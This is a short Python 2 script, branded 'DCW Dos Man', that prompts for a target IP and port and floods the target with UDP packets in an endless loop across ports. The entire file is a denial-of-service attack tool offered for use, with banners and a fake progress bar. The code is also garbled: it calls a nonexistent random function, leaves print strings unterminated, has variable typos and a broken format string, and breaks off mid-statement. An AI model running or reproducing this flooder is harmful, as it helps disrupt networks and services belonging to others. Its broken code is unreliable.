import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

###############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._unrandom(1490)
#############

os.system("clear")
os.system("figlet DCW Dos Man")
print
print "SEMU
print "NIK MOK T9EWED
print "Owner Of Scripts : SEMU
print "HHHHHHHHHHHHHHHHHHHHHHHH
print
ip = raw_input("Target Ip : ")
port = input("Enter Port : ")

os.system("clear")
os.system("figlet DCW Ddos Man Runing")
print "[+]--                      [+] 0%
time.sleep(2)
print "[+]-xxxxxx>                [+] 25%
time.sleep(2)
print "[+]-xxxxxxxxxxx>           [+] 50%
time.sleep(3)
print "[+]-xxxxxxxxxxxxxxxxx>      [+] 75%
time.sleep(2)
print "[+]-xxxxxxxxxxxxxxxxxxxxxx>  [+] 100%
time.sleep(2)
sent = 0
while True:
       sock.sendto(bytes, (ip,port))
       sent = send +1 
       port = port +1
       print "Black NYDRA ; Sent %s Packet To %s thourght port:%s "(sent,ip,port)
       if port == 65534 :